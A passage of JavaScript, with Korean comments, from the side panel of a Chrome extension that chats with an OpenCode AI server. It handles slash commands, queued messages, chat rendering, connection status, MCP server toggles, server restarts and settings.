    }));

    content.appendChild(picker);
    messageDiv.appendChild(avatar);
    messageDiv.appendChild(content);
    messagesContainer.appendChild(messageDiv);
    scrollToBottom();
  }

  async function executeCommand(input) {
    const parts = input.trim().split(/\s+/);
    const slash = parts[0].toLowerCase();
    const args = parts.slice(1).join(' ');

    addUserMessage(input);
    messageInput.value = '';
    messageInput.style.height = 'auto';
    sendBtn.disabled = true;
    hideCommandDropdown();

    if (slash === '/help') {
      const lines = commandCatalog.map(c => `${c.slash.padEnd(12)} ${c.description}`).join('\n');
      addBotMessage(t('사용 가능한 커맨드:\n\n') + lines);
      sendBtn.disabled = false;
      return;
    }

    if (slash === '/clear') {
      messagesContainer.innerHTML = '';
      try {
        const result = await sendMessageToBackground('create-session', { title: 'Chrome Extension Chat' });
        if (result.success) currentSessionId = result.sessionId;
        else currentSessionId = null;
      } catch {
        currentSessionId = null;
        addErrorMessage(t('세션 재생성에 실패했습니다.'));
      }
      addBotMessage(t('채팅이 초기화되었습니다.'));
      sendBtn.disabled = false;
      return;
    }

    if (slash === '/new') {
      if (isLoading) { addBotMessage(t('응답 중에는 새 세션을 시작할 수 없습니다.')); sendBtn.disabled = false; return; }
      messagesContainer.innerHTML = '';
      try {
        const result = await sendMessageToBackground('create-session', { title: 'Chrome Extension Chat', tabId: currentTabId });
        currentSessionId = result.success ? result.sessionId : null;
        addBotMessage(t('새 세션을 시작했습니다.'));
      } catch {
        currentSessionId = null;
        addErrorMessage(t('세션 재생성에 실패했습니다.'));
      }
      sendBtn.disabled = false;
      return;
    }

    if (slash === '/sessions' || slash === '/resume') {
      if (isLoading) { addBotMessage(t('응답 중에는 세션을 전환할 수 없습니다.')); sendBtn.disabled = false; return; }
      await showSessionPicker();
      sendBtn.disabled = false;
      return;
    }

    if (slash === '/model') {
      if (!args) { showModelPicker(); sendBtn.disabled = false; return; }
      const found = findModelByName(args);
      if (!found) { addBotMessage(t('모델을 찾을 수 없습니다: {name}', { name: args })); sendBtn.disabled = false; return; }
      try {
        await applyModel(found.providerID, found.modelID);
        addBotMessage(t('모델이 변경되었습니다: {name}', { name: found.modelID }));
      } catch (e) {
        addErrorMessage(t('모델 변경 실패: {error}', { error: t(e.message) }));
      } finally {
        sendBtn.disabled = false;
      }
      return;
    }

    if (slash === '/wd') {
      if (!args) { addBotMessage(t('사용법: /wd <path>')); sendBtn.disabled = false; return; }
      try {
        const result = await sendMessageToBackground('set-working-directory', { directory: args, tabId: currentTabId });
        if (result?.success === false) throw new Error(workingDirError(result));
        updateWorkingFolderDisplay(result.directory || args);
        applyWorkingDirSessionReset(result);
        addBotMessage(t('작업 디렉토리가 변경되었습니다: {dir}', { dir: result.directory || args }));
      } catch (e) {
        addErrorMessage(t('디렉토리 변경 실패: {error}', { error: t(e.message) }));
      } finally {
        sendBtn.disabled = false;
      }
      return;
    }

    const cmd = commandCatalog.find(c => c.slash === slash && !c.id.startsWith('local.'));
    if (cmd) {
      let promptText = cmd.template || slash;
      if (args) promptText = promptText.replace(/\$ARGUMENTS/g, args);
      setLoadingState(true);
      addTypingIndicator();
      try {
        await sendMessageToBackground('send-message', { sessionId: currentSessionId, message: promptText });
      } catch (error) {
        removeTypingIndicator();
        addErrorMessage(t('커맨드 실행 실패: {error}', { error: t(error.message) }));
        setLoadingState(false);
      }
      return;
    }

    // 미인식 커맨드 → AI에 그대로 전달
    setLoadingState(true);
    addTypingIndicator();
    try {
      await sendMessageToBackground('send-message', { sessionId: currentSessionId, message: input });
    } catch (error) {
      removeTypingIndicator();
      addErrorMessage(t('메시지 전송에 실패했습니다.'));
      setLoadingState(false);
    }
  }

  async function sendMessage() {
    const message = messageInput.value.trim();
    if (isServerTransitioning()) return;
    if (!message && attachedFiles.length === 0) return;

    // 응답 중: 서버 큐에 대기 메시지로 보낸다(현재 응답이 끝나면 모델이 이어서 처리). 명령은 응답이 끝난 뒤에만.
    if (isLoading && message.trim().toLowerCase() !== '/ext-log') {
      if (message.startsWith('/')) {
        showToast(t('응답 중에는 명령을 실행할 수 없습니다. 끝난 뒤 다시 시도하세요.'));
        return;
      }
      if (!currentSessionId) return;
      await sendQueuedMessage(message);
      return;
    }

    if (message.startsWith('/')) {
      if (message.trim().toLowerCase() === '/ext-log') {
        addUserMessage(message);
        messageInput.value = '';
        messageInput.style.height = 'auto';
        sendBtn.disabled = true;
        hideCommandDropdown();
        await showDebugLog();
        sendBtn.disabled = false;
        return;
      }
      if (!currentSessionId) return;
      await executeCommand(message);
      return;
    }

    if (!currentSessionId) return;

    const { payload, attachments } = takeComposedMessage(message);
    addUserMessage(message, attachments);
    await startPrompt(payload);
  }

  // 입력창의 메시지와 첨부를 꺼내(입력창은 비운다) 서버로 보낼 본문을 만든다.
  function takeComposedMessage(message) {
    const attachments = attachedFiles.slice();
    const attachmentBlock = attachments.length > 0
      ? `[첨부 파일 — 필요 시 read 도구로 읽어 분석하세요]\n${attachments.map((f) => `- ${f}`).join('\n')}\n\n`
      : '';
    messageInput.value = '';
    messageInput.style.height = 'auto';
    attachedFiles = [];
    renderAttachments();
    return { payload: attachmentBlock + message, attachments };
  }

  async function startPrompt(payload) {
    setLoadingState(true);
    addTypingIndicator();
    try {
      await sendMessageToBackground('send-message', {
        sessionId: currentSessionId,
        message: payload
      });
    } catch (error) {
      console.error('메시지 전송 실패:', error);
      removeTypingIndicator();
      addErrorMessage(t('메시지 전송에 실패했습니다.'));
      setLoadingState(false);
      return false;
    }
    return true;
  }

  // ============================================
  // 대기(pending) 메시지
  // ============================================
  // 응답 중에 보낸 메시지는 background의 queue-message로 서버 큐에 넣는다. 서버는 현재 응답이 끝나면
  // 대기 메시지를 이어서 처리하고, background가 turn-start로 알려 주면 그 말풍선 아래에 새 응답을 연다.
  // entry.state: 'sending'(접수 요청 중) | 'queued'(서버 큐) | 'local'(진행 중인 응답이 막 끝나 큐에 못 넣음 →
  // 완료 후 일반 전송)
  let pendingQueue = [];
  let queueConsumed = 0; // 이번 응답에서 서버가 처리를 시작한 대기 메시지 수(turn-start의 consumed와 맞춘다)

  function setQueueBadge(entry, state) {
    entry.el.classList.toggle('queued', state === 'queued');
    let badge = entry.el.querySelector('.queue-badge');
    if (!state) { badge?.remove(); return; }
    if (!badge) {
      badge = document.createElement('div');
      badge.className = 'queue-badge';
      entry.el.querySelector('.message-content')?.appendChild(badge);
    }
    badge.classList.toggle('warn', state !== 'queued');
    if (state === 'queued') {
      badge.textContent = t('⏳ 대기 중 — 현재 응답이 끝나면 처리됩니다');
      badge.title = '';
    } else if (state === 'unprocessed') {
      badge.textContent = t('처리되지 않음 — 다시 보내 주세요');
      badge.title = t('서버 기록에는 남아 있어 다음 대화의 맥락에 포함될 수 있습니다.');
    } else if (state === 'failed') {
      badge.textContent = t('전송 실패');
      badge.title = '';
    }
  }

  async function sendQueuedMessage(message) {
    const { payload, attachments } = takeComposedMessage(message);
    const entry = { el: addUserMessage(message, attachments), payload, state: 'sending' };
    pendingQueue.push(entry);
    setQueueBadge(entry, 'queued');
    renderProgress();
    await submitQueued(entry);
  }

  async function submitQueued(entry) {
    entry.state = 'sending';
    try {
      const res = await sendMessageToBackground('queue-message', { sessionId: currentSessionId, message: entry.payload });
      if (!pendingQueue.includes(entry)) return; // 그 사이 응답이 중단·완료돼 정리됨
      entry.state = res.queued ? 'queued' : 'local';
      if (!res.queued && !isLoading) flushLocalQueue();
    } catch (error) {
      if (!pendingQueue.includes(entry)) return;
      pendingQueue = pendingQueue.filter((q) => q !== entry);
      setQueueBadge(entry, 'failed');
      showToast(t('대기 메시지 전송에 실패했습니다: {error}', { error: t(error.message) }));
    }
    renderProgress();
  }

  // 응답이 끝났는데 큐에 넣지 못한 메시지가 있으면 첫 번째는 일반 전송, 나머지는 그 응답의 대기 메시지로 보낸다.
  async function flushLocalQueue() {
    if (isLoading) return;
    const locals = pendingQueue.filter((q) => q.state === 'local');
    if (locals.length === 0) return;
    const [first, ...rest] = locals;
    pendingQueue = pendingQueue.filter((q) => q !== first);
    setQueueBadge(first, null);
    // 응답 말풍선(typing indicator)이 보낸 메시지 바로 아래에, 나머지 대기 메시지는 그 뒤에 오도록 옮긴다
    messagesContainer.appendChild(first.el);
    const started = startPrompt(first.payload); // typing indicator를 동기적으로 먼저 붙인다
    for (const q of rest) messagesContainer.appendChild(q.el);
    if (!(await started)) return;
    for (const q of rest) await submitQueued(q);
  }

  // 서버가 대기 메시지 처리를 시작했다(background turn-start). consumed = 지금까지 처리 시작한 대기 메시지 수.
  function handleTurnStart(part) {
    const started = [];
    while (queueConsumed < part.consumed) {
      const entry = pendingQueue.find((q) => q.state === 'queued' || q.state === 'sending');
      queueConsumed++;
      if (!entry) continue;
      pendingQueue = pendingQueue.filter((q) => q !== entry);
      setQueueBadge(entry, null);
      started.push(entry);
    }
    if (part.newBubble) {
      // 이전 턴의 말풍선을 마무리하고, 새 응답은 처리 중인 대기 메시지 바로 아래에 연다
      blockRenderScheduler.flush();
      if (activeBlocks) {
        finalizeRunning(activeBlocks, 'interrupted');
        renderBlocks(activeBlocks, activeBlocksContainer);
        enhanceCodeBlocks(activeBlocksContainer);
        activeBlocks = null;
        activeBlocksContainer = null;
      }
      removeTypingIndicator();
      addTypingIndicator(started.at(-1)?.el || null);
    }
    noteProgress('waiting', '', { newTurn: part.newBubble });
  }

  // 응답이 끝났을 때 처리되지 않은 대기 메시지를 정리한다.
  //  - recovered: SW 재시작 복구로 끝난 경우 처리 여부를 알 수 없어 배지만 지운다.
  function settleQueue({ cancelled = false, recovered = false } = {}) {
    for (const entry of pendingQueue) {
      if (entry.state === 'local' && !cancelled) continue; // 완료 후 일반 전송
      setQueueBadge(entry, recovered ? null : 'unprocessed');
    }
    pendingQueue = pendingQueue.filter((q) => q.state === 'local' && !cancelled);
    queueConsumed = 0;
  }

  function addUserMessage(content, attachments = []) {
    const messageDiv = document.createElement('div');
    messageDiv.className = 'message user-message';
    messageDiv.innerHTML = `
      <div class="message-avatar">👤</div>
      <div class="message-content">${escapeHtml(content)}</div>
    `;
    if (attachments.length > 0) {
      const contentDiv = messageDiv.querySelector('.message-content');
      const list = document.createElement('div');
      list.className = 'message-attachments';
      attachments.forEach((filePath) => {
        const item = document.createElement('div');
        item.className = 'message-attachment-item';
        item.title = filePath;
        item.textContent = (filePath.replace(/\\/g, '/').split('/').pop() || filePath);
        list.appendChild(item);
      });
      contentDiv.appendChild(list);
    }
    messagesContainer.appendChild(messageDiv);
    scrollToBottom();
    return messageDiv;
  }

  function addBotMessage(content) {
    removeTypingIndicator();

    const messageDiv = document.createElement('div');
    messageDiv.className = 'message bot-message';
    const avatar = document.createElement('div');
    avatar.className = 'message-avatar';
    avatar.textContent = '🤖';
    const contentDiv = document.createElement('div');
    contentDiv.className = 'message-content markdown-body';
    contentDiv.dataset.raw = content;
    contentDiv.innerHTML = renderMarkdown(content);
    messageDiv.appendChild(avatar);
    messageDiv.appendChild(contentDiv);
    messagesContainer.appendChild(messageDiv);
    enhanceCodeBlocks(contentDiv);
    scrollToBottom();
  }

  function addTypingIndicator(afterEl = null) {
    const typingDiv = document.createElement('div');
    typingDiv.className = 'message bot-message typing-indicator';
    typingDiv.id = 'typing-indicator';
    typingDiv.innerHTML = `
      <div class="message-avatar">🤖</div>
      <div class="message-content">
        <span></span>
        <span></span>
        <span></span>
      </div>
    `;
    if (afterEl && afterEl.parentNode === messagesContainer) afterEl.after(typingDiv);
    else messagesContainer.appendChild(typingDiv);
    scrollToBottom();
  }

  function removeTypingIndicator() {
    const typing = document.getElementById('typing-indicator');
    if (typing) typing.remove();
  }

  function addErrorMessage(message) {
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.textContent = message;
    messagesContainer.appendChild(errorDiv);
    scrollToBottom();
  }

  const runtimeBadge = document.getElementById('runtime-badge');

  // runtime: 'wsl' | 'windows' | null(숨김). 서버가 연결돼 있을 때만 표시한다.
  function setRuntimeBadge(runtime) {
    if (!runtime) {
      runtimeBadge.classList.add('hidden');
      return;
    }
    runtimeBadge.textContent = RUNTIME_LABELS[runtime];
    runtimeBadge.classList.remove('hidden');
  }

  async function refreshRuntimeBadge() {
    try {
      const info = await sendMessageToBackground('get-runtime-info');
      setRuntimeBadge(info.port && info.serverIsWSL !== null ? (info.serverIsWSL ? 'wsl' : 'windows') : null);
    } catch {
      setRuntimeBadge(null);
    }
  }

  let connectionStatus = 'connecting';
  // 서버가 아직(또는 잠시) 없어서 요청을 보내면 안 되는 상태
  function isServerTransitioning(status = connectionStatus) {
    return status === 'connecting' || status === 'restarting';
  }

  function updateConnectionStatus(status) {
    connectionStatus = status;
    if (status !== 'connected') setRuntimeBadge(null);
    header.classList.remove('connected', 'connecting');
    inputArea.classList.remove('disabled');
    // 연결·하드 재시작 중에는 MCP/설정 메뉴와 입력을 막고, 끝나면 다시 활성화한다.
    // (연결 실패 상태에서는 /ext-log를 입력할 수 있도록 입력칸은 막지 않는다)
    const isConnecting = isServerTransitioning(status);
    mcpBtn.disabled = isConnecting;
    settingsBtn.disabled = isConnecting;
    messageInput.disabled = isConnecting;
    if (isConnecting) hideCommandDropdown();
    if (status !== 'connected') closeModelDropdown();
    if (isConnecting) {
      mcpDropdown.classList.add('hidden');
      settingsDropdown.classList.add('hidden');
    }
    connectingIndicator.classList.add('hidden');
    connectingSpinner.classList.remove('hidden');
    retryBtn.classList.add('hidden');
    logBtn.classList.add('hidden');

    switch (status) {
      case 'connected':
        header.classList.add('connected');
        connectionText.textContent = t('연결됨');
        break;
      case 'connecting':
        header.classList.add('connecting');
        connectionText.textContent = t('연결 중...');
        inputArea.classList.add('disabled');
        connectingMessage.textContent = 'OpenCode server connecting...';
        connectingIndicator.classList.remove('hidden');
        break;
      case 'restarting':
        header.classList.add('connecting');
        connectionText.textContent = t('재시작 중...');
        inputArea.classList.add('disabled');
        connectingMessage.textContent = 'OpenCode server restarting...';
        connectingIndicator.classList.remove('hidden');
        break;
      case 'disconnected':
        connectionText.textContent = t('연결 안됨');
        inputArea.classList.add('disabled');
        connectingMessage.textContent = t('서버 연결에 실패했습니다');
        connectingSpinner.classList.add('hidden');
        retryBtn.classList.remove('hidden');
        logBtn.classList.remove('hidden');
        connectingIndicator.classList.remove('hidden');
        break;
      case 'error':
        connectionText.textContent = t('오류');
        inputArea.classList.add('disabled');
        connectingMessage.textContent = t('연결 오류가 발생했습니다');
        connectingSpinner.classList.add('hidden');
        retryBtn.classList.remove('hidden');
        logBtn.classList.remove('hidden');
        connectingIndicator.classList.remove('hidden');
        break;
    }
  }

  logBtn.addEventListener('click', () => showDebugLog());

  retryBtn.addEventListener('click', () => {
    init();
  });

  // mode: 'missing'(host 미설치) | 'outdated'(설치됐지만 확장보다 낮은 버전)
  // 안내하는 인스톨러는 항상 현재 확장 버전과 같은 릴리스의 파일이다.
  function showNativeHostGuide(mode = 'missing', hostVersion = null) {
    const { version } = chrome.runtime.getManifest();
    guideDownloadBtn.href = `https://github.com/fantaXII/opencode_chrome_ext/releases/download/v${version}/opencode-native-host-setup-v${version}.exe`;

    const outdated = mode === 'outdated';
    document.getElementById('guide-title').textContent = outdated ? t('Native Host 업데이트 필요') : t('Native Host 설치 필요');
    document.getElementById('guide-desc').innerHTML = outdated
      ? t('확장 프로그램이 업데이트되어<br>Native Host도 최신 버전이 필요합니다.')
      : t('Chrome 확장과 OpenCode를 연결하는<br>Native Host 프로그램이 필요합니다.');
    const note = document.getElementById('guide-version-note');
    note.textContent = outdated
      ? t('설치된 버전: {installed} → 필요한 버전: v{required} (기존 설치 위에 그대로 설치하면 됩니다)', { installed: hostVersion ? 'v' + hostVersion : t('구버전'), required: version })
      : t('설치할 버전: v{version}', { version });
    note.classList.remove('hidden');
    guideDismissBtn.classList.toggle('hidden', !outdated);

    nativeHostGuide.classList.remove('hidden');
    if (!outdated) {
      updateConnectionStatus('disconnected');
      connectingIndicator.classList.add('hidden');
    }
  }

  function hideNativeHostGuide() {
    nativeHostGuide.classList.add('hidden');
  }

  // 업데이트 안내를 이번 패널 세션 동안만 닫는다(패널을 다시 열면 구버전일 때 다시 안내).
  let hostGuideDismissed = false;

  guideRetryBtn.addEventListener('click', () => {
    hostGuideDismissed = false;
    hideNativeHostGuide();
    init();
  });

  guideDismissBtn.addEventListener('click', () => {
    hostGuideDismissed = true;
    hideNativeHostGuide();
  });

  // 서버 연결에 성공한 뒤 설치된 host가 확장 버전보다 낮으면 업데이트를 안내한다.
  async function checkHostVersionAndGuide() {
    if (hostGuideDismissed) return;
    try {
      const res = await sendMessageToBackground('check-host-version');
      if (res.state === 'outdated') showNativeHostGuide('outdated', res.hostVersion);
    } catch {}
  }

  async function loadMcpStatus() {
    try {
      const res = await sendMessageToBackground('get-mcp-status');
      if (res.success) {
        mcpServers = res.servers;
        updateMcpBadge();
      }
    } catch (e) {}
  }

  function updateMcpBadge() {
    const entries = Object.entries(mcpServers);
    const active = entries.filter(([, s]) => s.status === 'connected').length;
    const total = entries.length;
    const el = document.getElementById('mcp-count-text');
    if (total === 0) {
      el.textContent = 'MCP';
      mcpBtn.classList.remove('has-active');
    } else {
      el.textContent = `MCP ${active}/${total}`;
      mcpBtn.classList.toggle('has-active', active > 0);
    }
  }

  // MCP 목록 아래에 고정으로 붙는 소프트 재시작 액션.
  // - "설정 다시 읽기": POST /global/dispose (프로세스 유지, 1~2초). MCP/skill/agent를
  //   새로 등록했을 때 TUI를 exit 후 재진입한 것과 같은 효과.
  // 서버 강제 재시작과 실행 환경(WSL/Windows) 선택은 설정(⚙) 드롭다운에 있다.
  const mcpActionsHtml = () => `
    <div class="mcp-actions">
      <button id="mcp-reload-btn" class="mcp-action-btn"
              title="${t('opencode가 config/MCP/skill/agent를 디스크에서 다시 읽습니다 (서버 프로세스 유지)')}">${t('↻ 설정 다시 읽기')}</button>
      <div id="mcp-action-status" class="mcp-action-status hidden"></div>
    </div>`;

  function renderMcpDropdown() {
    const entries = Object.entries(mcpServers);
    if (entries.length === 0) {
      mcpDropdown.innerHTML = `<div class="mcp-empty">${t('MCP 서버 없음')}</div>` + mcpActionsHtml();
      bindMcpActions();
      return;
    }
    mcpDropdown.innerHTML = entries.map(([name, info]) => {
      const isOn = info.status === 'connected' || info.status === 'failed';
      const dotClass = info.status === 'connected' ? 'mcp-dot-connected'
                     : info.status === 'failed'    ? 'mcp-dot-failed'
                     :                               'mcp-dot-disabled';
      const statusLabel = info.status === 'connected' ? t('연결됨')
                        : info.status === 'failed'    ? t('오류')
                        :                               t('비활성');
      const errorTip = info.error ? ` title="${escapeHtml(info.error)}"` : '';
      return `<div class="mcp-item">
        <span class="mcp-dot ${dotClass}">●</span>
        <div class="mcp-item-info"${errorTip}>
          <span class="mcp-item-name">${escapeHtml(name)}</span>
          <span class="mcp-item-status">${statusLabel}</span>
        </div>
        <label class="mcp-toggle">
          <input type="checkbox" data-name="${escapeHtml(name)}" ${isOn ? 'checked' : ''}>
          <span class="mcp-toggle-slider"></span>
        </label>
      </div>`;
    }).join('') + mcpActionsHtml();

    bindMcpActions();

    mcpDropdown.querySelectorAll('input[type="checkbox"]').forEach(cb => {
      cb.addEventListener('change', async (e) => {
        const name = e.target.dataset.name;
        const connect = e.target.checked;
        e.target.disabled = true;
        try {
          const res = await sendMessageToBackground('toggle-mcp', { name, connect });
          if (res.success) {
            mcpServers = res.servers;
            updateMcpBadge();
            renderMcpDropdown();
          } else {
            e.target.checked = !connect;
            e.target.disabled = false;
          }
        } catch {
          e.target.checked = !connect;
          e.target.disabled = false;
        }
      });
    });
  }

  // 드롭다운은 토글/재시작마다 innerHTML을 다시 쓰므로 상태 문구를 여기 보관해
  // 재렌더 후에도 복원한다. MCP·설정 드롭다운이 같은 문구를 공유한다.
  let mcpActionStatus = null; // { text, kind }
  let restartBusy = false;

  function applyMcpActionStatus() {
    for (const id of ['mcp-action-status', 'settings-action-status']) {
      const el = document.getElementById(id);
      if (!el) continue;
      if (!mcpActionStatus) {
        el.className = 'mcp-action-status hidden';
        el.textContent = '';
        continue;
      }
      el.className = 'mcp-action-status' + (mcpActionStatus.kind ? ` ${mcpActionStatus.kind}` : '');
      el.textContent = mcpActionStatus.text;
    }
  }

  function setMcpActionStatus(text, kind) {
    mcpActionStatus = text ? { text, kind } : null;
    applyMcpActionStatus();
  }

  function bindMcpActions() {
    const reloadBtn = document.getElementById('mcp-reload-btn');
    if (restartBusy && reloadBtn) reloadBtn.disabled = true;
    applyMcpActionStatus();

    reloadBtn?.addEventListener('click', () => runServerRestart('soft'));
  }

  // 재시작 후 서버에서 다시 읽어야 하는 목록들을 갱신한다.
  async function refreshServerCatalogs() {
    const prevAgentName = availableAgents[currentAgentIndex]?.name;
    await loadMcpStatus();
    await loadCommandCatalog();
    await loadAgents();
    // loadAgents()는 선택을 0번으로 되돌리므로 이전에 고른 에이전트를 복원한다.
    if (prevAgentName) {
      const idx = availableAgents.findIndex(a => a.name === prevAgentName);
      if (idx >= 0) {
        currentAgentIndex = idx;
        updateAgentBar();
      }
    }
    await loadModels();
  }

  // runtime: 하드 재시작 때만 사용. 'wsl' | 'windows'면 그 환경으로 전환, 없으면 저장된 우선순위.
  async function runServerRestart(mode, runtime) {
    if (restartBusy) return;
    const isHard = mode === 'hard';

    restartBusy = true;
    setRestartControlsDisabled(true);
    const runtimeLabel = runtime ? RUNTIME_LABELS[runtime] : null;
    setMcpActionStatus(isHard
      ? (runtimeLabel
          ? t('{runtime}(으)로 서버를 재시작하는 중… (최대 30초)', { runtime: runtimeLabel })
          : t('서버를 재시작하는 중… (최대 30초)'))
      : t('설정을 다시 읽는 중…'), null);

    // 재시작하면 진행 중인 응답은 서버 쪽에서 사라진다. 로딩 상태가 영구히 남지 않도록
    // 먼저 취소해 UI를 정리한다.
    if (isLoading) await cancelMessage();

    // 하드 재시작은 서버 프로세스가 사라지므로 처음 연결할 때처럼 입력을 막고 진행 상태를 보여준다.
    // (소프트 재시작은 1~2초이고 프로세스가 유지되므로 막지 않는다)
    if (isHard) updateConnectionStatus('restarting');

    const fail = (error) => {
      setMcpActionStatus(t('실패: {error}', { error: t(error || '알 수 없는 오류') }), 'error');
      if (isHard) {
        updateConnectionStatus('disconnected');
        addErrorMessage(t('서버 재시작 실패: {error}', { error: t(error || '알 수 없는 오류') }));
      }
    };

    try {
      const res = await sendMessageToBackground(
        isHard ? 'restart-server' : 'restart-instance',
        isHard && runtime ? { preferredRuntime: runtime } : {}
      );
      if (!res?.success) {
        fail(res?.error);
        return;
      }

      updateConnectionStatus('connected');
      refreshRuntimeBadge();
      await refreshServerCatalogs();

      const suffix = isHard && res.portChanged ? t(' (포트 {port})', { port: res.port }) : '';
      const doneText = isHard ? t('서버 재시작 완료{suffix}', { suffix }) : t('설정을 다시 읽었습니다');
      setMcpActionStatus(doneText, 'ok');
      // 하드 재시작 중에는 설정 메뉴가 닫혀 있으므로 결과를 채팅에도 남긴다
      if (isHard) addBotMessage(doneText);
    } catch (error) {
      fail(error.message);
    } finally {
      restartBusy = false;
      invalidateAppliedProxy(); // 재시작하면 서버 프로세스의 프록시 환경변수가 바뀔 수 있다
      // 목록/실행 환경이 바뀌었을 수 있으므로 열려 있는 드롭다운을 다시 그린다
      // (상태 문구는 재렌더 후 복원된다).
      if (!mcpDropdown.classList.contains('hidden')) renderMcpDropdown();
      if (!settingsDropdown.classList.contains('hidden')) renderSettingsDropdown();
      applyMcpActionStatus();
      setRestartControlsDisabled(restartBusy);
    }
  }

  function setRestartControlsDisabled(disabled) {
    document.querySelectorAll('#mcp-reload-btn, #settings-hard-restart-btn, #runtime-pref, #proxy-save-btn, #proxy-reset-btn, .settings-field input')
      .forEach(el => { el.disabled = disabled; });
  }

  // ---- 확인/취소 다이얼로그 (사이드패널에서는 window.confirm을 보장할 수 없다) ----
  const confirmDialog = document.getElementById('confirm-dialog');
  const confirmTitle = document.getElementById('confirm-title');
  const confirmMessage = document.getElementById('confirm-message');
  const confirmOkBtn = document.getElementById('confirm-ok-btn');
  const confirmCancelBtn = document.getElementById('confirm-cancel-btn');

  function showConfirm(title, message, { okText = t('확인'), cancelText = t('취소') } = {}) {
    return new Promise((resolve) => {
      confirmTitle.textContent = title;
      confirmMessage.textContent = message;
      confirmOkBtn.textContent = okText;
      confirmCancelBtn.textContent = cancelText;
      confirmDialog.classList.remove('hidden');
      confirmOkBtn.focus();

      const finish = (result) => {
        confirmDialog.classList.add('hidden');
        confirmOkBtn.removeEventListener('click', onOk);
        confirmCancelBtn.removeEventListener('click', onCancel);
        confirmDialog.removeEventListener('click', onBackdrop);
        document.removeEventListener('keydown', onKey, true);
        resolve(result);
      };
      const onOk = () => finish(true);
      const onCancel = () => finish(false);
      const onBackdrop = (e) => { if (e.target === confirmDialog) finish(false); };
      const onKey = (e) => {
        if (e.key === 'Escape') { e.stopPropagation(); finish(false); }
      };
      confirmOkBtn.addEventListener('click', onOk);
      confirmCancelBtn.addEventListener('click', onCancel);
      confirmDialog.addEventListener('click', onBackdrop);
      document.addEventListener('keydown', onKey, true);
    });
  }

  // ---- 설정(⚙) 드롭다운: 실행 환경(WSL/Windows) 선택 + 서버 강제 재시작 ----
  // '본문·선택 텍스트' 모드에서 탭 내용을 읽기 위한 선택적 호스트 권한(manifest optional_host_permissions)
  const PAGE_ACCESS_ORIGINS = ['<all_urls>'];
  // 응답 제한 시간(분) 선택지. background.js RESPONSE_TIMEOUT_CHOICES_MIN과 같이 고친다. 0 = 없음(기본).
  const RESPONSE_TIMEOUT_CHOICES_MIN = [0, 5, 10, 30];
  const RUNTIME_LABELS = { get auto() { return t('자동'); }, wsl: 'WSL', windows: 'Windows' };

  // 정보 섹션 상태: 패널을 여는 동안 유지한다.
  let proxyOpen = false;          // 프록시 섹션 펼침 여부(다시 그려도 유지)
  let proxyCache = null;          // 저장된 프록시 값(null = 아직 읽지 않음, 패널을 열 때마다 새로 읽는다)
  let proxyDraft = null;          // 저장하지 않은 입력값(재렌더 시 유지)
  let hostInfo = null;            // check-host-version 결과 캐시
  let hostInfoRequested = false;
  let pendingUpdate = null;       // Chrome이 받아 둔 새 확장 버전 { version }
  let updateCheckText = '';       // 업데이트 확인 결과 문구
  let updateCheckBusy = false;

  chrome.storage.local.get('pendingUpdate').then((v) => { pendingUpdate = v.pendingUpdate || null; updateUpdateDot(); });
  chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== 'local' || !changes.pendingUpdate) return;
    pendingUpdate = changes.pendingUpdate.newValue || null;
    updateUpdateDot();
    if (!settingsDropdown.classList.contains('hidden')) renderSettingsDropdown();
  });

  function updateUpdateDot() {
    settingsBtn.classList.toggle('has-update', !!pendingUpdate);
    settingsBtn.title = pendingUpdate ? t('설정 · 새 버전 v{version} 준비됨', { version: pendingUpdate.version }) : t('설정');
  }

  function loadHostInfo(force = false) {
    if (hostInfoRequested && !force) return;
    hostInfoRequested = true;
    sendMessageToBackground('check-host-version')
      .then((res) => { hostInfo = res; })
      .catch(() => { hostInfo = { state: 'unknown', hostVersion: null }; })
      .finally(() => {
        if (!settingsDropdown.classList.contains('hidden')) renderSettingsDropdown();
      });
  }

  function hostVersionHtml() {
    if (!hostInfo) return `<span class="settings-muted">${t('확인 중…')}</span>`;
    const v = hostInfo.hostVersion ? `v${escapeHtml(hostInfo.hostVersion)}` : '';
    switch (hostInfo.state) {
      case 'ok': return `${v} ✓`;
      case 'outdated': return `${v || t('구버전')} ⚠ <button id="host-update-btn" class="mcp-action-btn">${t('업데이트')}</button>`;
      case 'missing': return `${t('미설치')} <button id="host-update-btn" class="mcp-action-btn">${t('설치')}</button>`;
      default: return v || '-';
    }
  }

  // 언어를 바꾸면 이미 그려진 UI 중 상태 기반으로 다시 그릴 수 있는 것만 갱신한다.
  // (이미 출력된 채팅 메시지는 그대로 둔다.)
  function onLanguageChanged() {
    updateUpdateDot();
    updateConnectionStatus(connectionStatus);
    updateAgentBar();
    updateWorkingFolderDisplay(currentWorkingDir || defaultWorkingDir, !currentWorkingDir);
    updateModelButton();
    if (!modelDropdown.classList.contains('hidden')) openModelDropdown();
    if (!mcpDropdown.classList.contains('hidden')) renderMcpDropdown();
    renderSettingsDropdown();
  }

  // 서버 프로세스가 실제로 가진 프록시(WSL만 조회 가능). host가 powershell/wsl.exe를 여러 번 띄워 느리므로
  // 패널 렌더를 막지 않고 백그라운드로 조회한다. null=미조회, 'loading', { env }=조회 결과.
  let appliedProxyState = null;
  let appliedProxyGen = 0;
  let settingsServerPort = null;

  // 조회할 수 없는 사유(host의 proxyEnvReason)를 짧게 안내한다.
  const APPLIED_PROXY_REASONS = {
    'no-listener': '서버 프로세스를 찾지 못했습니다.',
    'wsl-read-failed': 'WSL 프로세스의 환경변수를 읽지 못했습니다 (다른 사용자·다른 WSL 배포판에서 실행 중일 수 있음).',
    'unmanaged': '확장이 시작하지 않은 Windows 서버는 환경변수를 조회할 수 없습니다. 확장으로 재시작하면 확인할 수 있습니다.',
    'legacy-record': '이전 버전 확장이 시작한 서버라 조회할 수 없습니다. 재시작하면 확인할 수 있습니다.'
  };

  function appliedProxyHtml() {
    if (!settingsServerPort) return '';
    const title = t('서버에 적용된 프록시');
    if (appliedProxyState === null || appliedProxyState === 'loading') {
      return `<div class="applied-title">${title} <span class="applied-badge loading">${t('확인 중…')}</span></div>`;
    }
    const { env, source, reason } = appliedProxyState;
    if (!env) {
      const why = APPLIED_PROXY_REASONS[reason] || '서버에서 프록시 정보를 받지 못했습니다.';
      return `<div class="applied-title">${title} <span class="applied-badge na">${t('확인할 수 없음')}</span></div>
        <div class="applied-reason">${escapeHtml(t(why))}</div>`;
    }
    const fromRecord = source === 'record';
    const row = (label, value) => `<div class="applied-row"><span class="applied-label">${label}</span>` +
